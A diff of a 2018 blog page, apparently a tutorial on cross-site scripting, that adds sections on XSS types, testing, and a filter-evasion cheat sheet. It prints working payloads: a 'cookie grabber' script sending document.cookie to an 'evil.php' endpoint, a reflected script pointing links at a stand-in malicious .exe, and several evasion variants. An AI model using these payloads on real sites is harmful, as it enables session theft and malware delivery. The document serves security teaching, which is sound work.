@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user. Type Stored XSS AttacksThese are those">
+<meta name="description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples  User/Profiles page Sh">
 <meta name="keywords" content="XSS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cross-site Scripting">
 <meta property="og:url" content="http://www.lurking.link/2018/09/12/Cross-site-Scripting/index.html">
 <meta property="og:site_name" content="Lurking&#39;s Blog">
-<meta property="og:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user. Type Stored XSS AttacksThese are those">
+<meta property="og:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples  User/Profiles page Sh">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-11T17:45:36.874Z">
+<meta property="og:updated_time" content="2018-09-24T15:54:29.516Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cross-site Scripting">
-<meta name="twitter:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user. Type Stored XSS AttacksThese are those">
+<meta name="twitter:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples  User/Profiles page Sh">
 
 
 
@@ -386,13 +386,63 @@
       
 
       
-        <h2 id="Common-occurrences-of-vulnerabilities"><a href="#Common-occurrences-of-vulnerabilities" class="headerlink" title="Common occurrences of vulnerabilities"></a>Common occurrences of vulnerabilities</h2><p>The data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.</p>
-<h2 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h2><ul>
-<li>Stored XSS Attacks<br>These are those where the injected script is permanently stored on the target servers, such as in a database, in a message, in a message forum, visitor log, comment field, etc.</li>
-<li>Reflected XSS Attacks<br>These are those where the injected script is reflected directly off the web server when the request is sent.</li>
-<li>DOM XSS Attacks<br>DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write).</li>
+        <h2 id="Common-occurrences-of-vulnerabilities"><a href="#Common-occurrences-of-vulnerabilities" class="headerlink" title="Common occurrences of vulnerabilities"></a>Common occurrences of vulnerabilities</h2><p>The data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.<br><strong>Typical examples</strong></p>
+<ul>
+<li>User/Profiles page</li>
+<li>Shopping cart</li>
+<li>File Manager</li>
+<li>Application settings/preferences</li>
+<li>Forum/Message board</li>
+<li>Blog</li>
+<li>Log</li>
 </ul>
-
+<h2 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h2><ul>
+<li><p>Stored XSS Attacks<br>These are those where the injected script is permanently stored on the target servers, such as in a database, in a message, in a message forum, visitor log, comment field, etc.</p>
+</li>
+<li><p>Reflected XSS Attacks<br>These are those where the injected script is reflected directly off the web server when the request is sent.</p>
+<a id="more"></a>
+</li>
+<li><p>DOM XSS Attacks<br>DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write).</p>
+</li>
+</ul>
+<h2 id="Use-of-Vulnerabilities"><a href="#Use-of-Vulnerabilities" class="headerlink" title="Use of Vulnerabilities"></a>Use of Vulnerabilities</h2><p><em>Cookie Grabber</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);</span><br><span class="line">var img = document.createElement(“img”);</span><br><span class="line">var d1 = document.getElementById(“d1”);</span><br><span class="line">img.src = adr;</span><br><span class="line">d1.appendChild(img);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><em>Download of malicious software</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?id=&lt;script&gt;window.onload = function() &#123;</span><br><span class="line">var AllLinks=document.getELementByTagName(&quot;a&quot;);</span><br><span class="line">AllLinks[0].href = &quot;http://badexample.com/malicious.exe&quot;;</span><br><span class="line">&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Testing-of-Cross-site-scripting"><a href="#Testing-of-Cross-site-scripting" class="headerlink" title="Testing of Cross site scripting"></a>Testing of Cross site scripting</h2><p><strong>Reflected XSS</strong><br><em>Black Box testing</em></p>
+<ul>
+<li><code>&lt;script&gt;alert(123)&lt;/script&gt;</code></li>
+<li><code>“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+</ul>
+<ol>
+<li>Detect input vectors.</li>
+<li>Use one of the examples showed above to be input data in every input vector, then examine the resulting web page HTML and search for the test input.</li>
+</ol>
+<p><strong>Stored XSS</strong><br><em>Black Box testing</em><br>It’s similar to the process. We can exploit Stored XSS by some advanced<br>exploitation framework(Beff, XSS Proxy).</p>
+<p><em>White Box testing</em><br>The predefined variables/functions to store input from HTTP GET and POST<br>requests need to be focus.</p>
+<ul>
+<li><p>PHP</p>
+<blockquote>
+<p>$_GET – HTTP GET variables<br>$_POST – HTTP POST variables<br>$_REQUEST – HTTP POST, GET and COOKIE variables<br>$_FILES – HTTP File Upload variables</p>
+</blockquote>
+</li>
+<li><p>ASP</p>
+<blockquote>
+<p>Request.QueryString – HTTP GET<br>Request.Form – HTTP POST<br>Server.CreateObject – Used to upload files</p>
+</blockquote>
+</li>
+<li><p>JSP</p>
+<blockquote>
+<p>doGet, doPost servlets – HTTP GET and POST<br>request.getParameter – HTTP GET/POST variables</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>DOM XSS</strong><br><em>White Box testing</em><br>The API need to be concerned are the following</p>
+<blockquote>
+<p>document.location<br>document.URL<br>document.referrer<br>window.location<br>document.write<br>document.writeln<br>document.body.innerHTML<br>eval</p>
+</blockquote>
+<p>and so on.</p>
+<h2 id="XSS-Filter-Evasion-Cheat-Sheet"><a href="#XSS-Filter-Evasion-Cheat-Sheet" class="headerlink" title="XSS Filter Evasion Cheat Sheet"></a>XSS Filter Evasion Cheat Sheet</h2><p>Image tag<br><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code><br>No quotes and no semicolon<br><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code><br>Case insensitive<br><code>&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</code><br>HTML entities<br><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code><br>Grave accent obfuscation<br><code>&lt;IMG SRC=`javascript:alert(“RSnake says, ‘XSS’”)`&gt;</code><br>Malformed A tags<br><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</code><br>Malformed IMG tags<br><code>&lt;IMG src=&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code><br>fromCharCode<br><code>&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt;</code></p>
+<p>To be continue</p>
+<h2 id="XSS-Prevention-Cheat-Sheet"><a href="#XSS-Prevention-Cheat-Sheet" class="headerlink" title="XSS Prevention Cheat Sheet"></a>XSS Prevention Cheat Sheet</h2>
       
     </div>
     
@@ -566,7 +616,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-occurrences-of-vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Common occurrences of vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type"><span class="nav-number">2.</span> <span class="nav-text">Type</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-occurrences-of-vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Common occurrences of vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type"><span class="nav-number">2.</span> <span class="nav-text">Type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-of-Vulnerabilities"><span class="nav-number">3.</span> <span class="nav-text">Use of Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Testing-of-Cross-site-scripting"><span class="nav-number">4.</span> <span class="nav-text">Testing of Cross site scripting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Filter-Evasion-Cheat-Sheet"><span class="nav-number">5.</span> <span class="nav-text">XSS Filter Evasion Cheat Sheet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Prevention-Cheat-Sheet"><span class="nav-number">6.</span> <span class="nav-text">XSS Prevention Cheat Sheet</span></a></li></ol></div>
             
 
           </div>
